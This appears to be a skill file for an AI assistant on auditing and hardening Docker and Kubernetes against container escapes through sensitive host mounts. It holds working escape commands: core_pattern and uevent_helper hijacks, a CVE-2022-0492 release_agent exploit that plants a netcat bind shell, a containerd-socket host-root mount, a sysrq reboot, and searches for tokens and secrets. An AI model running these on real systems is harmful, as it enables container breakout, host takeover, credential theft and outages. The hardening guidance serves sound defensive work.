---
name: docker-sensitive-mounts-security
description: Security analysis for Docker/Kubernetes container sensitive mount vulnerabilities. Use this skill whenever the user mentions container security, Docker escapes, Kubernetes pod security, sensitive mounts, /proc, /sys, /var, containerd sockets, kubelet, privilege escalation, or any container breakout scenario. This skill helps identify dangerous mount configurations, test for vulnerabilities, and generate hardening recommendations.
---

# Docker Sensitive Mounts Security Analysis

This skill helps you analyze, test, and harden container configurations against sensitive mount vulnerabilities that can lead to container escapes and privilege escalation.

## When to Use This Skill

Use this skill when you need to:
- Audit container mount configurations for security risks
- Test for container escape vulnerabilities via sensitive mounts
- Generate hardening recommendations for Docker/Kubernetes deployments
- Understand specific CVEs related to container mount vulnerabilities
- Review Pod/Container security contexts
- Analyze runtime socket exposure risks

## Quick Reference: Critical Sensitive Paths

### High-Risk Host Paths (Never Mount to Untrusted Containers)

| Path | Risk | Impact |
|------|------|--------|
| `/proc` | Kernel parameter modification | Host compromise, RCE |
| `/sys` | Kernel interface access | DoS, RCE, MAC bypass |
| `/var` | Container filesystem access | Pivot, credential theft |
| `/run/containerd/containerd.sock` | Container runtime control | Full host access |
| `/var/run/kubelet.sock` | Kubelet API access | Cluster compromise |
| `/sys/fs/cgroup` | Cgroup manipulation | CVE-2022-0492 exploitation |

## Vulnerability Categories

### 1. `/proc` Vulnerabilities

#### `/proc/sys/kernel/core_pattern`
**Risk**: Write access allows arbitrary code execution on crash

```bash
# Test write access
[ -w /proc/sys/kernel/core_pattern ] && echo "VULNERABLE: core_pattern is writable"

# Exploitation (if writable)
echo "|/tmp/malicious.sh" > /proc/sys/kernel/core_pattern
# Trigger crash to execute payload
```

#### `/proc/sys/kernel/modprobe`
**Risk**: Kernel module loading path exposure

```bash
# Check access
ls -l $(cat /proc/sys/kernel/modprobe 2>/dev/null)
```

#### `/proc/sysrq-trigger`
**Risk**: Can reboot or crash the host

```bash
# Test access (DANGEROUS - may reboot host)
echo b > /proc/sysrq-trigger  # Reboots immediately!
```

#### `/proc/kallsyms`
**Risk**: Kernel symbol addresses leak (KASLR bypass)

```bash
# Check if readable
cat /proc/kallsyms 2>/dev/null | head -20
```

#### `/proc/[pid]/mem`
**Risk**: Process memory access

```bash
# Test access to another process memory
cat /proc/1/mem 2>/dev/null | head -c 100
```

### 2. `/sys` Vulnerabilities

#### `/sys/kernel/uevent_helper`
**Risk**: Arbitrary script execution on uevent triggers

```bash
# Test write access
[ -w /sys/kernel/uevent_helper ] && echo "VULNERABLE: uevent_helper is writable"

# Exploitation pattern
echo "/tmp/malicious-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent  # Trigger execution
```

#### `/sys/kernel/debug`
**Risk**: Unrestricted kernel debugging interface

```bash
# Check if mounted
mount | grep debugfs
```

#### `/sys/firmware/efi/vars`
**Risk**: EFI variable manipulation (can brick hardware)

```bash
# Check access
ls -la /sys/firmware/efi/vars/ 2>/dev/null
```

### 3. `/var` Vulnerabilities

**Risk**: Access to other containers' filesystems and credentials

```bash
# Find sensitive files in mounted /var
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep -E 'kubernetes|aws'

# Kubernetes service account tokens
find /host-var/lib/kubelet/pods/ -name 'token' 2>/dev/null

# Docker overlay filesystems
ls -la /var/lib/docker/overlay2/ 2>/dev/null
```

### 4. Runtime Socket Exposure

**Critical sockets that grant full host access:**

```bash
# Containerd socket
ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /host/run/containerd.sock run --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw busybox:latest host /bin/sh

# Podman socket
podman --unix-socket=/host/run/podman/podman.sock exec -it host /bin/bash

# Kubelet API
curl -k https://localhost:10250/pods
```

### 5. Cgroup v1 Vulnerabilities (CVE-2022-0492)

**Risk**: Malicious release_agent execution as host root

```bash
# Test for vulnerability (requires CAP_SYS_ADMIN)
mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
echo '/tmp/pwn' > /sys/fs/cgroup/release_agent
echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
echo 0 > /tmp/x/cgroup.procs  # Triggers release_agent
```

## Known CVEs (2023-2025)

| CVE | Component | Description | Fix Version |
|-----|-----------|-------------|-------------|
| CVE-2024-21626 | runc ≤ 1.1.11 | File descriptor leak to host root | runc ≥ 1.1.12 |
| CVE-2024-23651 | BuildKit < 0.12.5 | OverlayFS TOCTOU race | BuildKit ≥ 0.12.5 |
| CVE-2024-1753 | Buildah ≤ 1.35.0 | Bind-mount path resolution | Buildah ≥ 1.35.1 |
| CVE-2024-40635 | containerd < 1.7.27 | UID integer overflow to root | containerd ≥ 1.7.27 |
| CVE-2022-0492 | cgroup v1 | release_agent privilege escalation | Kernel ≥ 5.8 patched |

## Hardening Recommendations

### Docker Hardening

```dockerfile
# Recommended security options
FROM alpine:latest

# Run as non-root
USER 1000:1000

# Read-only root filesystem
# (handled at runtime with --read-only)

# Drop all capabilities
# (handled at runtime with --cap-drop=ALL)
```

```bash
# Safe container run command
docker run \
  --read-only \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --security-opt=no-new-privileges:true \
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \
  --mount type=bind,src=/safe/path,dst=/app,readonly \
  my-image
```

### Kubernetes Hardening

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
    sysctls:
      - name: kernel.core_pattern
        value: "core"
  containers:
    - name: app
      image: my-app:latest
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
        seccompProfile:
          type: RuntimeDefault
      volumeMounts:
        - name: safe-data
          mountPath: /data
          readOnly: true
  volumes:
    - name: safe-data
      hostPath:
        path: /safe/host/path
        type: Directory
        # Never use these paths:
        # /proc, /sys, /var, /run, /dev, /etc/kubernetes
```

### Pod Security Standards

```yaml
# Use restricted profile (most secure)
apiVersion: v1
kind: Namespace
metadata:
  name: secure-namespace
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

## Testing Scripts

Use the bundled scripts for automated checks:

- `scripts/check-sensitive-mounts.sh` - Scan running containers for dangerous mounts
- `scripts/generate-hardening-report.sh` - Generate hardening recommendations

## References

- [0xn3va Container Escape Cheat Sheet](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [runc CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
- [NCC Group Container Security](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Unit 42 CVE-2022-0492 Analysis](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

## Important Warnings

⚠️ **Never run these tests on production systems without authorization**

⚠️ **Some tests can crash or reboot the host system**

⚠️ **Always test in isolated environments first**

⚠️ **Some exploits require specific kernel versions or configurations**
